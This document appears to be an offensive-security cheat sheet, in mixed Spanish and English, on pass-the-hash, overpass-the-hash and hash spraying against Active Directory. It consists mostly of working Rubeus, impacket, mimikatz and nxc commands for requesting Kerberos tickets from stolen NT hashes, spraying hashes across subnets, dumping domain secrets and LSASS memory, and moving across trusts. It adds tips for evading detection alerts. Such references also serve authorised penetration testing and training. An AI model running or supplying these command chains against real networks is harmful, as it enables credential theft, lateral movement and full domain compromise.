---
aliases:
  - Overpass-the-Hash
  - PtH Spray
  - Hash Reuse
  - Rubeus asktgt
tags:
  - type/technique
  - technique/lateral-movement
  - technique/credential-access
  - asset/active-directory
  - cred/ntlm
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Pass-the-Hash]]"
---
# Pass-the-Hash - Overpass-the-Hash & Hash Spray

***

## Overpass-the-Hash Concept

| **Aspecto** | **Detalle** | **Importancia** |
|:---:|:---:|:---:|
| Mecanismo | NT hash → request TGT → use TGT (Kerberos) | Convierte PtH a Kerberos. |
| Por qué | Kerberos auth = less detectable que NTLM en domains modernos | OPSEC. |
| Defender benefit | Modern envs alertan agresivamente sobre NTLM auth | Bypass NTLM detection. |
| Tools | Rubeus (Windows), getTGT.py (Linux), mimikatz | Standard. |
| Required | NT hash OR AES key del user | Pre-attack. |
^pth-overpass-concept

___

## Rubeus asktgt (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe asktgt /user:admin /rc4:<NT> /domain:corp.local /ptt` | Request TGT con NT + inject (PtT) | Standard overpass. |
| `Rubeus.exe asktgt /user:admin /aes256:<key> /domain:corp.local /ptt` | AES256 (less detectable que RC4) | OPSEC. |
| `Rubeus.exe asktgt /user:admin /rc4:<NT> /domain:corp.local /dc:<DC> /ptt` | DC explícito | Targeted. |
| `Rubeus.exe asktgt /user:admin /rc4:<NT> /domain:corp.local /ticket:tgt.kirbi` | Save TGT a file (no inject) | Save for later. |
| `Rubeus.exe asktgt /user:admin /rc4:<NT> /domain:corp.local /createnetonly:cmd.exe` | New process con TGT inject | Stealth process tree. |
^pth-overpass-rubeus

```cmd
:: Standard Rubeus pipeline
Rubeus.exe asktgt /user:Administrator /rc4:aabbcc1122... /domain:corp.local /ptt

:: Verify
klist

:: Use Kerberos auth
dir \\dc01.corp.local\C$
```

**AES preferred:** RC4 hash request triggers `Encryption type RC4 used` alerts. AES256 = baseline modern auth, no alert.

___

## getTGT.py (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `getTGT.py corp.local/Administrator -hashes :<NT> -dc-ip <DC>` | Request TGT desde Linux | Standard Linux. |
| `getTGT.py corp.local/Administrator -aesKey <AES256> -dc-ip <DC>` | AES key | OPSEC. |
| `getTGT.py corp.local/Administrator -hashes :<NT> -no-pass -k -dc-ip <DC>` | Existing TGT | Edge. |
^pth-overpass-gettgt

```bash
# Standard pipeline
impacket-getTGT corp.local/Administrator -hashes :aabbcc1122... -dc-ip 10.10.10.10

# Output: Administrator.ccache file
export KRB5CCNAME=Administrator.ccache

# Use TGT
impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local -just-dc
```

___

## mimikatz Overpass

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<NT> /run:cmd.exe` | Inject hash + spawn cmd | First step (NTLM cached). |
| (En cmd injected) `klist` | Verify NTLM tickets | Pre-Kerberos. |
| (En cmd injected) `dir \\dc01\C$` | Trigger Kerberos request → TGT cached | Auto-overpass. |
| `mimikatz # kerberos::list` | Verify TGT request | Confirm. |
^pth-overpass-mimi

**Cómo funciona overpass via mimikatz:** después de `sekurlsa::pth`, el primer Kerberos request del cmd injected genera TGT usando NT hash. Próximas auth = Kerberos transparente.

___

## Hash Spray (1 hash × N targets)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <range> -u administrator -H <NT> --local-auth` | Spray local admin hash sobre subnet | Hash reuse hunt. |
| `nxc smb <range> -u administrator -H <NT> --local-auth --continue-on-success` | No stop on first hit | Comprehensive. |
| `nxc winrm <range> -u user -H <NT>` | Spray WinRM access | Lateral surface. |
| `nxc rdp <range> -u user -H <NT>` | RDP NLA check (PtH-style) | Limited (NLA bypass needed). |
| `nxc smb <range> -u administrator -H <hashes.txt> --local-auth` | Multiple hashes file | Hash collection. |
^pth-overpass-spray

**Most common privesc:** local Administrator pwd reused entre hosts. Domain admin hash sprayed = critical priv. nxc output `(Pwn3d!)` = success.

```bash
# Pipeline standard hash reuse hunt
NT=aabbccdd1122...

# Sweep subnet
nxc smb 10.10.10.0/24 -u administrator -H $NT --local-auth | grep "Pwn3d"

# Output: hosts donde admin local pwd es igual
# Cada uno = SYSTEM RCE potential
```

___

## Hash Spray (1 user × N hashes)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u <user> -H <hashes.txt> --no-bruteforce` | Test multiple hashes para un user | Hash collection. |
| `nxc smb <target> -u <users.txt> -H <hashes.txt> --no-bruteforce` | Cross matrix (loud) | Bulk validation. |
^pth-overpass-multihash

**Caveat:** spray multiple hashes = multiple bad attempts → lockout risk. Sin `--no-bruteforce` flag, nxc trata como brute force = lockout.

___

## Cross-Domain / Forest Spray

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u user -H <NT> -d partner.com` | Cross-domain auth attempt | Cross-trust. |
| `getTGT.py partner.com/user -hashes :<NT> -dc-ip <foreign-DC>` | Cross-domain TGT | Linux. |
| `Rubeus.exe asktgt /user:user /rc4:<NT> /domain:partner.com /dc:<foreign-DC> /ptt` | Cross-domain Windows | Standard. |
^pth-overpass-cross

___

## Spray + Pivoting

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <range> -u user -H <NT> --sessions \| grep -A2 <target-user>` | Find host where target user has session | Targeted hunt. |
| `nxc smb <pwned-host> -u user -H <NT> -M lsassy` | LSASS dump via SMB (extract more creds) | Cred chain. |
| `nxc smb <pwned-host> -u user -H <NT> -M comsvcs` | comsvcs.dll MiniDump (LOLBin) | Stealth dump. |
^pth-overpass-pivot

```bash
# Hash reuse → LSASS dump chain
NT=aabbccdd...

# Find pwned hosts
nxc smb 10.10.10.0/24 -u administrator -H $NT --local-auth | grep "Pwn3d" > pwned.txt

# Dump LSASS de cada pwned host
nxc smb pwned.txt -u administrator -H $NT --local-auth -M lsassy
# Output: nuevos hashes de users logueados
```

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `STATUS_ACCOUNT_LOCKED_OUT` | Hash incorrecto + threshold reached | Wait lockout window. |
| Rubeus `KRB_AP_ERR_SKEW` | Clock skew >5min entre attacker + DC | NTP sync. |
| `KDC has no support for encryption type` | Account no soporta RC4 (`UseDESKeyOnly` o AES-only) | Use AES key. |
| `(KRB_AP_ERR_MODIFIED)` post-Overpass | TGT corrupted / KVNO mismatch | Re-request TGT. |
| nxc spray output sin `Pwn3d!` | Hash válido pero sin admin priv | Try other users / methods. |
^pth-overpass-errors

***
